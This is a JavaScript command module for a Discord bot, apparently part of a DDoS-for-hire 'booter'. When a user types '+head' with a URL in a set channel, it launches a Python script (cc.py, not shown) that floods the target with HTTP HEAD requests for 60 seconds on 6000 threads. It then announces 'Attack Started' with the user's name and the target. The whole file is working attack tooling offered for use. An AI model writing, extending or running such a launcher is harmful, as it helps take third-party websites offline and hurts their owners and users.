const { MessageEmbed } = require("discord.js")
const spawn = require("child_process")

module.exports = {
    name: 'head',
    description: 'head methods layer7',
    execute(client, message, args, Discord) {
        const url = message.content.split (" ")[1]

if(!args[0]) {
	const embed1 = new MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`VD: +head [url]`")
	message.channel.send(embed1);
	return;
	}
	
if (message.channel.id != 1001403369325342751) {
	return;
  }
  
var spawn = require('child_process').spawn
const childPython = spawn('python', ['cc.py', '-url', `${url}`, '-m', 'head', '-s', '60', '-t', '6000']) 
const embed = new MessageEmbed()
    .setTitle("Attack Started:")
    .setDescription(`**User**: \`${message.author.username}\`\n**URL**: \`${url}\`\n**Second**: \`60\`\n**Power**: \`4000\``)
    .setTimestamp()
    .setImage(`https://storage.inewsdb.com/aa25a92bb1cd746cf9d0160993afc832.jpg`)
    message.channel.send(embed)    
}
    }